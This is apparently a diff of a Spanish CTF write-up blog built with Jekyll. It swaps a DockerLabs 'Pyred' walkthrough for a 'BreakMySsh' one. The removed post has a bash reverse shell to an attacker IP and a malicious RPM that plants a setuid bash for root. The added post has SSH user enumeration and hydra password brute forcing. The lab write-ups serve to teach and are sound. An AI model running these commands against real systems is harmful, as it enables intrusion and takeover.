@@ -44,27 +44,25 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.3" />
-<meta property="og:title" content="Pyred , DOCKERLABS" />
-<meta name="author" content="Firstatack" />
+<meta property="og:title" content="BreakMySsh , DockerLabs" />
 <meta property="og:locale" content="es" />
-<meta name="description" content="Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es . Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , envio de revshell y escalada de privelegios." />
-<meta property="og:description" content="Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es . Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , envio de revshell y escalada de privelegios." />
-<link rel="canonical" href="http://localhost:4000/posts/pyred/" />
-<meta property="og:url" content="http://localhost:4000/posts/pyred/" />
+<meta name="description" content="Blog dedicado a la resolucion de maquinas CTF, la ciberseguridad, temas de linux. hydra feroxbuster nmap chisel nc y algun oftopic. hacking pentesting manuales writeups tutorial python bash reverse shell" />
+<meta property="og:description" content="Blog dedicado a la resolucion de maquinas CTF, la ciberseguridad, temas de linux. hydra feroxbuster nmap chisel nc y algun oftopic. hacking pentesting manuales writeups tutorial python bash reverse shell" />
+<link rel="canonical" href="http://localhost:4000/posts/breakssh/" />
+<meta property="og:url" content="http://localhost:4000/posts/breakssh/" />
 <meta property="og:site_name" content="CTF’s Linux Apuntes" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2024-04-19T00:00:00-03:00" />
+<meta property="article:published_time" content="2024-05-11T00:00:00-03:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Pyred , DOCKERLABS" />
+<meta property="twitter:title" content="BreakMySsh , DockerLabs" />
 <meta name="twitter:site" content="@firstatack" />
-<meta name="twitter:creator" content="@Firstatack" />
 <meta name="google-site-verification" content="W-9NcBppWJit0_JSlb-tSEccz0fimupFf4latnvZtZQ" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firstatack"},"dateModified":"2024-04-19T00:00:00-03:00","datePublished":"2024-04-19T00:00:00-03:00","description":"Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es . Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , envio de revshell y escalada de privelegios.","headline":"Pyred , DOCKERLABS","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/pyred/"},"url":"http://localhost:4000/posts/pyred/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-11T00:00:00-03:00","datePublished":"2024-05-11T00:00:00-03:00","description":"Blog dedicado a la resolucion de maquinas CTF, la ciberseguridad, temas de linux. hydra feroxbuster nmap chisel nc y algun oftopic. hacking pentesting manuales writeups tutorial python bash reverse shell","headline":"BreakMySsh , DockerLabs","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/breakssh/"},"url":"http://localhost:4000/posts/breakssh/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>Pyred , DOCKERLABS | CTF's Linux Apuntes
+  <title>BreakMySsh , DockerLabs | CTF's Linux Apuntes
   </title>
 
   <!--
@@ -480,7 +478,7 @@
         
           
             
-              <span>Pyred , DOCKERLABS</span>
+              <span>BreakMySsh , DockerLabs</span>
             
 
           
@@ -555,6 +553,85 @@
     
       
       
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
     
 
     
@@ -1031,7 +1108,7 @@
 
 <article class="px-1">
   <header>
-    <h1 data-toc-skip>Pyred , DOCKERLABS</h1>
+    <h1 data-toc-skip>BreakMySsh , DockerLabs</h1>
 
     <div class="post-meta text-muted">
       <!-- published date -->
@@ -1047,13 +1124,13 @@
 
 <time
   
-  data-ts="1713495600"
+  data-ts="1715396400"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Apr 19, 2024
+  May 11, 2024
 </time>
 
       </span>
@@ -1072,10 +1149,7 @@
 
           <em>
             
-              
-                
-                
-              
+              <a href="https://twitter.com/firstatack">first_atack</a>
             
           </em>
         </span>
@@ -1101,9 +1175,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="605 words"
+  title="353 words"
 >
-  <em>3 min</em> read</span>
+  <em>1 min</em> read</span>
 
       </div>
       <!-- .d-flex -->
@@ -1112,186 +1186,94 @@
   </header>
 
   <div class="content">
-    <p>Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es .
-Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , envio de revshell y escalada de privelegios.</p>
+    <p><a href="/assets/logo-dockerlabs.png" class="popup img-link  shimmer"><img src="/assets/logo-dockerlabs.png" alt="logodocker" width="200" height="200" loading="lazy"></a></p>
 
-<h2 id="herramientas-y-recursos-usados"><span class="me-2">HERRAMIENTAS Y RECURSOS USADOS</span><a href="#herramientas-y-recursos-usados" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  encontramos con escaneo de puertos para buscar una entrada al sistema  , explotacion de ssh , decryt md5 y login.</p>
+
+<h2 id="herramientas-y-recursos-usados"><span class="me-2">Herramientas y recursos usados</span><a href="#herramientas-y-recursos-usados" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
 <ul>
-  <li>nmap</li>
+  <li>Nmap</li>
+  <li>hydra</li>
   <li>Python</li>
-  <li>Sudo</li>
-  <li>fpm</li>
-  <li>https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-1-creating-a-malicious-rpm-package</li>
+  <li>Google</li>
 </ul>
 
-<h2 id="empezamos"><span class="me-2">Empezamos</span><a href="#empezamos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h2 id="enumeracion"><span class="me-2">Enumeracion</span><a href="#enumeracion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>Como al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , como comprobar la conexion con un ping.</p>
-
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>ping <span class="nt">-c1</span> 172.17.0.2
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.</p>
+<p>Empezamos lanzando un nmap contra el objetivo .</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sSVC</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-A</span> <span class="nt">-vvv</span> 172.17.0.2
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>nmap <span class="nt">-p</span> 1-100 <span class="nt">--open</span> <span class="nt">-sC</span> 172.17.0.2 <span class="nt">-oX</span> breaknmap
 </pre></td></tr></tbody></table></code></div></div>
+<p><a href="/reporte/breaknmap.html" title="reportesnmap">Reporte nmap</a></p>
 
-<p><a href="/assets/pyred/nmap.png" class="popup img-link  shimmer"><img src="/assets/pyred/nmap.png" alt="800x600" loading="lazy"></a></p>
+<p>Nmap nos informa que solo tenemos el 22 abierto y con el nombre de la maquina ya tenemos claro que nos invita e explotar el servicio SSH de algun modo.
+Si lanzamos un nmap -sV nos dara la version que corre que es una 7.7.</p>
 
-<p>Observamos el resultado y vemos que solo tiene el puerto 5000 abierto , por lo tanto la entrada esta en esa web asi que vamos a revisarla.</p>
+<p>Ahora buscamos un script que nos permita realizar la tarea de enumeracion.</p>
 
-<p><a href="/assets/pyred/web_term_Python.png" class="popup img-link  shimmer"><img src="/assets/pyred/web_term_Python.png" alt="800x600" loading="lazy"></a></p>
+<h2 id="explotacion"><span class="me-2">Explotacion</span><a href="#explotacion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>El codigo fuente no muestra nada pero por lo que parece es un shell interactivo de python , asi que probamos a ejecutar comandos.</p>
+<p>En este punto directamente hubiesemos podido tirar con hydra o similar, para hacer fuerza bruta contra el user y el pass.
+Yo personalmente prefiero tener alguno de esos dos datos , ademas la maquina para mi es para que aprendamos a manejar ese tipo de enumeracion.
+Tambien podriais con msfconsole</p>
 
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">loco</span><span class="sh">"</span><span class="p">)</span>
-</pre></td></tr></tbody></table></code></div></div>
+<p><a href="https://github.com/Sait-Nuri/CVE-2018-1547">Link to exploit</a></p>
 
-<h2 id="infiltración"><span class="me-2">Infiltración</span><a href="#infiltración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p>Como hemos comprobado si que ejecuta, así que intentamos mandarnos una revshell.
-Para ello antes de ejecutar la rev nos colocamos a la escucha en la maquina atacante.</p>
+<p>Descargenlo y sigan los pasos que indica el autor en github.</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 443
+</pre></td><td class="rouge-code"><pre>./CVE-2018-15473.py <span class="nt">-p</span> 22 <span class="nt">-w</span> ../../../../rockyou.txt  172.17.0.2
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>y en la victima ejecutamos:</p>
+<p><a href="/assets/breakssh/enum.png" class="popup img-link  shimmer"><img src="/assets/breakssh/enum.png" alt="enum" loading="lazy"></a></p>
 
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">os</span>
-
-<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">bash -c bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1</span><span class="sh">"</span><span class="p">)</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<p><a href="/assets/pyred/nc.png" class="popup img-link  shimmer"><img src="/assets/pyred/nc.png" alt="800x600" loading="lazy"></a></p>
-
-<p>Ya tenemos la revshell y podemos trabajar directamente en el objetivo y pasamos a escalar privilegios.</p>
-
-<h2 id="escalada-de-privilegios"><span class="me-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-
-<p>Como siempre empezaremos por lo mas basico buscando ficheros con permisos erroneos scripts con suid.</p>
+<p>Con el usario que nos dio el exploit lanzamos hydra.</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
-<span class="nb">sudo</span> <span class="nt">-l</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/pyred/find.png" class="popup img-link  shimmer"><img src="/assets/pyred/find.png" alt="800x600" loading="lazy"></a></p>
-
-<p><a href="/assets/pyred/sudo.png" class="popup img-link  shimmer"><img src="/assets/pyred/sudo.png" alt="800x600" loading="lazy"></a></p>
-
-<p>El comando find no devuelve nada aprovechable de momento , pero sudo nos da la idea de como atacar puesto que el usuario primpi puede ejecutar dnf que es un gestor de paquetes de fedora.</p>
-
-<p>Podemos usar gtfobins para averiguar como explotar esa vulnerabilidad.</p>
-
-<p>Yo tengo instalado searchbins y ejecuto , donde  -b es el binario al que tenemos acceso y -f indica la funcion que utilizaremos para acceder al binario</p>
-
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>./searchbins.sh <span class="nt">-b</span> dnf <span class="nt">-f</span> <span class="nb">sudo</span>
+</pre></td><td class="rouge-code"><pre>hydra <span class="nt">-l</span> lovely <span class="nt">-P</span> ../../../../rockyou.txt ssh://172.17.0.2 <span class="nt">-t</span> 4
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>El searchbins me devuelve lo siguiente:</p>
+<p><a href="/assets/breakssh/hydralovely.png" class="popup img-link  shimmer"><img src="/assets/breakssh/hydralovely.png" alt="hydralovely" loading="lazy"></a></p>
 
-<p>It runs commands using a specially crafted RPM package. Generate it with <a href="https://github.com/jordansissel/fpm">fpm</a> and upload it to the target.</p>
+<p>Nos conectamos via ssh con el usuario lovely , buscamos como escalar y encontramos un archivo oculto en opt , no obstante una vez conseguimos el primer user volvi a lanzar hydra contra root y obtuvo su pass.</p>
 
-<p>Descargamos e instalamos la herramienta para crear el rpm.</p>
+<p><a href="/assets/breakssh/hydraroot.png" class="popup img-link  shimmer"><img src="/assets/breakssh/hydraroot.png" alt="hydraroot" loading="lazy"></a></p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
-<span class="nb">echo</span> <span class="s1">'id'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/x.sh
-fpm <span class="nt">-n</span> x <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> rpm <span class="nt">-a</span> all <span class="nt">--before-install</span> <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
-</pre></td></tr></tbody></table></code></div></div>
+<h2 id="md5-decrypt"><span class="me-2">MD5 decrypt</span><a href="#md5-decrypt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>Debemos crear un  rpm malicioso en nuestra maquina atacante , lo cual lo podemos hacer con los comandos anteriores y una vez lo tengamos subirlo a la maquina victima e instalarlo.
-Usaremos los siguientes comandos.</p>
+<p>Descifrando el hash.</p>
 
-<p>En maquina atacante :</p>
+<p>Podemos ir a la web de crackstation hay varias de este tipo y pasarle el hash</p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>python3 <span class="nt">-m</span> http.server
-</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/breakssh/crackstation.png" class="popup img-link  shimmer"><img src="/assets/breakssh/crackstation.png" alt="crastation" loading="lazy"></a></p>
 
-<p>Y el la victima :</p>
+<p>Como vemos nos da el mismo pass que hydra.</p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>curl <span class="nt">-O</span> http://ipatacante/rpmcreado
-<span class="nb">sudo </span>dnf <span class="nb">install</span> <span class="nt">-y</span> rpmcreado.rpm
-</pre></td></tr></tbody></table></code></div></div>
+<p>La cuestion es que lo queria descifrar en local y ni con john ni con openssl pude, no se si con openssl estaba haciendo una burrada pero bueno asi aprendemos, no hay perdidas de tiempo solo callejones en los que aprendemos a no  meternos .</p>
 
-<p>Yo personalmente no acabo de entender que es lo que hacen exactamente esos comandos así que busque otra forma de hacerlo que fuera mas entendible para mi , así que hice lo siguiente.</p>
+<p>Busque un script que hace el trabajo.</p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nb">mkdir </span>exploit_rpm
-</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/breakssh/decrypt.png" class="popup img-link  shimmer"><img src="/assets/breakssh/decrypt.png" alt="decrypt" loading="lazy"></a></p>
 
-<p>Creo un script en el directorio creado anteriormente con el siguiente contenido.</p>
+<p>Ahora ya root.</p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
-<span class="nb">cp</span> /bin/bash /tmp/bash
-<span class="nb">chmod</span> +xs /tmp/bash
-</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/breakssh/root.png" class="popup img-link  shimmer"><img src="/assets/breakssh/root.png" alt="root" loading="lazy"></a></p>
 
-<p>Una vez creado el script hago uso de la herramienta fpm que hemos instalado anteriormente , yo al ser usuario de arch no tengo instalado rpmbuild asi que me lance un VM de kali para realizar esa tarea y ejecute :</p>
+<p>Hasta aqui la maquinita con diversos ataques para ek mismo resultado.
+Comenten si ven algo mal y avisen que es de agradecer.</p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>fpm <span class="nt">-n</span> exploit <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> rpm <span class="nt">--before-install</span> ./exploit/exploit.sh ./exploit
+<p>Un saludo y muchas gracias</p>
 
-Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span class="s2">"exploit-1.0-1.x86_64.rpm"</span><span class="o">}</span>
-</pre></td></tr></tbody></table></code></div></div>
+<p>Difundan</p>
 
-<p>Ahora que ya lo tenemos creado solo tendremos que enviarlo a la maquina objetivo y instalarlo y ejecutarlo como explique antes el ultimo comando que utilizo para ser root es :</p>
-
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>/tmp/bash <span class="nt">-p</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Como observamos ya estamos como superuser.</p>
-
-<p><a href="/assets/pyred/id.png" class="popup img-link  shimmer"><img src="/assets/pyred/id.png" alt="800x600" loading="lazy"></a></p>
-
-<p>Hasta aqui llegamos , un saliudo y gracias por leer.</p>
 
   </div>
 
@@ -1311,9 +1293,9 @@ Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span c
         <i class="fa fa-tags fa-fw me-1"></i>
         
           <a
-            href="/tags/cft/"
+            href="/tags/ctf/"
             class="post-tag no-text-decoration"
-          >cft</a>
+          >ctf</a>
         
           <a
             href="/tags/hacking/"
@@ -1359,21 +1341,21 @@ Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span c
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=Pyred%20,%20DOCKERLABS%20-%20CTF's%20Linux%20Apuntes&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpyred%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=BreakMySsh%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fbreakssh%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=Pyred%20,%20DOCKERLABS%20-%20CTF's%20Linux%20Apuntes&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpyred%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=BreakMySsh%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fbreakssh%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpyred%2F&text=Pyred%20,%20DOCKERLABS%20-%20CTF's%20Linux%20Apuntes" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fbreakssh%2F&text=BreakMySsh%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -1736,211 +1718,211 @@ Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span c
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
 
 
 
@@ -1956,7 +1938,7 @@ Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span c
     <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
       
         <article class="col">
-          <a href="/posts/domain/" class="post-preview card h-100">
+          <a href="/posts/hidden-docker/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -1968,14 +1950,14 @@ Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span c
 
 <time
   
-  data-ts="1713668400"
+  data-ts="1714186800"
   data-df="ll"
   
 >
-  Apr 21, 2024
+  Apr 27, 2024
 </time>
 
-              <h4 class="pt-0 my-2">Domain , DOCKERLABS</h4>
+              <h4 class="pt-0 my-2">Hidden , DockerLabs</h4>
               <div class="text-muted">
                 <p>
                   
@@ -1984,8 +1966,9 @@ Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span c
 
 
 
-                  Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .
-Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al ...
+                  
+
+En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster y busqueda de subdominios con wfuzz , revshell , movimientos laterales y esc...
                 </p>
               </div>
             </div>
@@ -1993,7 +1976,7 @@ Nos encontramos con las siguientes características y dificultades , en el tendr
         </article>
       
         <article class="col">
-          <a href="/posts/trust/" class="post-preview card h-100">
+          <a href="/posts/summervibes/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -2005,14 +1988,14 @@ Nos encontramos con las siguientes características y dificultades , en el tendr
 
 <time
   
-  data-ts="1713754800"
+  data-ts="1714359600"
   data-df="ll"
   
 >
-  Apr 22, 2024
+  Apr 29, 2024
 </time>
 
-              <h4 class="pt-0 my-2">Trust , DOCKERLABS</h4>
+              <h4 class="pt-0 my-2">Summervibes , DockerLabs</h4>
               <div class="text-muted">
                 <p>
                   
@@ -2021,9 +2004,13 @@ Nos encontramos con las siguientes características y dificultades , en el tendr
 
 
 
-                  Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .
+                  
 
-Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al...
+En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster , explotacion de cve , revshell y escalada
+
+Herramientas y recursos usados
+
+...
                 </p>
               </div>
             </div>
@@ -2031,7 +2018,7 @@ Nos encontramos con las siguientes características y dificultades , en el tendr
         </article>
       
         <article class="col">
-          <a href="/posts/vacaciones/" class="post-preview card h-100">
+          <a href="/posts/whereismywebshell/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -2043,14 +2030,14 @@ Nos encontramos con las siguientes características y dificultades , en el tendr
 
 <time
   
-  data-ts="1713754800"
+  data-ts="1714446000"
   data-df="ll"
   
 >
-  Apr 22, 2024
+  Apr 30, 2024
 </time>
 
-              <h4 class="pt-0 my-2">Vacaciones , DOCKERLABS</h4>
+              <h4 class="pt-0 my-2">Whereismywebshell , DockerLabs</h4>
               <div class="text-muted">
                 <p>
                   
@@ -2059,9 +2046,12 @@ Nos encontramos con las siguientes características y dificultades , en el tendr
 
 
 
-                  Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.
+                  
 
-Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entra...
+En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.
+
+Herramientas y recursos usados
+...
                 </p>
               </div>
